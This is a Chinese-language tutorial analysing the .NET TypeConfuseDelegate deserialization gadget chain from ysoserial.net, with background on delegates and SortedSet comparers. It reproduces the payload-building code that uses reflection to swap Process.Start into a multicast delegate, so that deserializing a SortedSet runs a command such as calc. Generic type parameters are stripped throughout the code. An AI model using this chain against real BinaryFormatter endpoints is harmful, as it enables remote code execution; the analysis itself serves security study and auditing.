## TypeConfuseDelegate
TypeConfuseDelegate中文翻译过来叫类型混淆委托。那么学习这条链之前必须要了解什么是委托。
### 委托和多播委托
委托本质上是一个存有方法引用的变量，我们来创建一个委托。
    class Program
    {
        public delegate void MyDelegate(string s);
        public static void PrintString(string s)
        {
            Console.WriteLine(s);
        }
        static void Main(string[] args)
        {
            MyDelegate myDelegate = new MyDelegate(PrintString);
            myDelegate("hello from delegate");
        }
    }
**需要注意的是传递给委托的方法签名必须和定义的委托签名一致，即返回值、参数一致。**
通过new
MyDelegate(PrintString)将PrintString的引用赋值给myDelegate，然后使用myDelegate("hello from
delegate")传递参数。myDelegate持有对PrintString的引用。
多播委托则是持有对委托列表的引用，把多播委托想象成一个列表，将委托的方法加入列表中，多播委托会按顺序依次调用每个委托。
    class Program
    {
        public delegate void MyDelegate(string s);
        public static void PrintString(string s)
        {
            Console.WriteLine($"print {s} to screen.");
        }
        public static void WriteToFile(string s)
        {
            Console.WriteLine($"write {s} to file.");
        }
        static void Main(string[] args)
        {
            MyDelegate myDelegate = new MyDelegate(PrintString);
            MyDelegate myDelegate1 = new MyDelegate(WriteToFile);
            myDelegate += myDelegate1;
            myDelegate("hello");
        }
    }
    // 输出
    print hello to screen.
    write hello to file.
通过+=的形式添加多个委托，执行myDelegate("hello")调用了PrintString和WriteToFile两个方法。不仅仅可以用+=的形式来合并委托，还可以用MulticastDelegate.Combine(printString,
writeFile)的形式。
    static void Main(string[] args)
    {
        MyDelegate printString = new MyDelegate(PrintString);
        MyDelegate writeFile = new MyDelegate(WriteToFile);
        Delegate twoDelegte = MulticastDelegate.Combine(printString, writeFile);
        twoDelegte.DynamicInvoke("something");
        Delegate[] delegates = twoDelegte.GetInvocationList();
        foreach (var item in delegates)
        {
            Console.WriteLine(item.Method);
        }
    }
    // 输出
    print something to screen.
    write something to file.
    Void PrintString(System.String)
    Void WriteToFile(System.String)
通过多播委托的twoDelegte.GetInvocationList()可以得到委托的列表。
接下来来看TypeConfuseDelegate这条链。
在ysoserial.net中的实现是通过`SortedSet`和Comparer进行利用的。SortedSet是一个可以排序的泛型集合，既然涉及到排序，那么肯定涉及到排序的规则，即比较器Comparer。
### SortedSet和Comparer
先来看微软文档中非常简单的一个例子
    using System;
    using System.Collections;
    using System.Collections.Generic;
    namespace BinaryFormatterSerialize
    {
        public class ByFileExtension : IComparer
        {
            string xExt, yExt;
            CaseInsensitiveComparer caseiComp = new CaseInsensitiveComparer();
            public int Compare(string x, string y)
            {
                // Parse the extension from the file name.
                xExt = x.Substring(x.LastIndexOf(".") + 1);
                yExt = y.Substring(y.LastIndexOf(".") + 1);
                // Compare the file extensions.
                int vExt = caseiComp.Compare(xExt, yExt);
                if (vExt != 0)
                {
                    return vExt;
                }
                else
                {
                    // The extension is the same,
                    // so compare the filenames.
                    return caseiComp.Compare(x, y);
                }
            }
        }
        class Program
        {
            public static void Main(string[] args)
            {
                var set = new SortedSet(new ByFileExtension());
                set.Add("test.c");
                set.Add("test.b");
                set.Add("test.a");
                foreach (var item in set)
                {
                    Console.WriteLine(item.ToString());
                }
                Console.ReadKey();
            }
        }
    }
    // 输出
    test.a
    test.b
    test.c
可见向set集合中添加的test.c、test.b、test.a按照后缀被自动排序。这里需要注意，自动排序的前提是必须要有两个以上的元素，即第二次添加的时候才会自动排序。
再来看自写的ByFileExtension()比较器，实现了`IComparer`接口，重写Compare()方法，返回一个int值。
此时回头看ysoserial.net中的代码
    Delegate da = new Comparison(String.Compare);
    Comparison d = (Comparison)MulticastDelegate.Combine(da, da);
    IComparer comp = Comparer.Create(d);
    SortedSet set = new SortedSet(comp);
用到了一个Comparison类
该类继承自`Comparer`抽象类，其Compare接收两个泛型参数，构造函数中赋值`_comparison`，`_comparison`是一个`Comparison`委托类型，其函数签名与比较函数相同。
而`Comparer`抽象类实现了`IComparer`接口
两个类均可用来序列化。
此时思考一下，Process.Start中有多个重载。
如果我们将Process.Start设置为比较器，那么向集合中添加的值就是Process.Start的参数，由此来进行命令执行。在委托中我们提到，委托的方法签名和委托必须一致，而对于`SortedSet`类来说，其比较函数类型为：
    int Comparison(T x, T y);
而Process.Start()的是：
    public static Process Start(string fileName, string arguments);
两个比较函数的返回类型不一致，一个是Process，一个是int，如果直接用Process.Start作为比较器，会编译失败。那么这个时候我们就需要借助多播委托了。
    // 创建一个string的比较器
    Delegate da = new Comparison(String.Compare);
    // 用两个string的比较器合并为一个多播委托
    Comparison d = (Comparison)MulticastDelegate.Combine(da, da);
    // Create()函数返回new ComparisonComparer(d)
    IComparer comp = Comparer.Create(d);
    // 将ComparisonComparer赋值给SortedSet的比较器
    SortedSet set = new SortedSet(comp);
    // set.Add("cmd.exe")
    set.Add(inputArgs.CmdFileName);
    // set.Add("calc")
    set.Add(inputArgs.CmdArguments);
    // 反射修改_invocationList
    FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
    object[] invoke_list = d.GetInvocationList();
    // 修改_invocationList 添加 Process::Start(string, string)
    invoke_list[1] = new Func(Process.Start);
    fi.SetValue(d, invoke_list);
至于为什么多播委托可以解决方法签名不一致的问题，原作者给出的解释如下：
> The only weird thing about this code is TypeConfuseDelegate. It’s a long
> standing issue that .NET delegates don’t always enforce their type
> signature, especially the return value. In this case we create a two entry
> multicast delegate (a delegate which will run multiple single delegates
> sequentially), setting one delegate to String::Compare which returns an int,
> and another to Process::Start which returns an instance of the Process
> class. This works, even when deserialized and invokes the two separate
> methods. It will then return the created process object as an integer, which
> just means it will return the pointer to the instance of the process object.
简单理解就是多播委托传递的是指针。
在SortedSet中OnDeserialization会在反序列化时触发，调用Add函数
而在Add的时候，经过多次重载调用了比较器的Compare()方法。即我们反射修改的Process.Start(string,string)
整个链条
至此分析就结束了。另外需要注意的是，`Comparer.Create(c)`该函数在dotnet4.5中才出现，低版本的dotnet无法利用成功。
# 审计
BinaryFormatter有多个反序列化方法重载，审计时应多加关注。
# 后文
本节讲解了BinaryFormatter在反序列化中的使用及TextFormattingRunProperties和DataSet两条反序列化利用链。